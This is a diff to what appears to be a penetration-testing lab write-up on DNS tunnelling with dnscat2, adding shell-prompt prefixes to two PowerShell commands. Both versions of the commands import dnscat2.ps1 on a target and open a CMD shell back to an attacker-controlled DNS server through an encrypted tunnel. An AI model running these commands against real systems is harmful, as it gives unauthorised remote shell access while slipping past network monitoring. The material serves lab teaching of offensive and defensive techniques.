@@ -518,12 +518,12 @@ Once the dnscat2.ps1 file is on the target we can import it and run associated c
 
 Importing dnscat2.ps1
 ```
-Import-Module .\dnscat2.ps1
+PS C:\suljov> Import-Module .\dnscat2.ps1
 ```
 
 After dnscat2.ps1 is imported, we can use it to establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server.
 ```
-Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
+PS C:\suljov> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
 ```
 
 We must use the pre-shared secret (-PreSharedSecret) generated on the server to ensure our session is established and encrypted. If all steps are completed successfully, we will see a session established with our server.
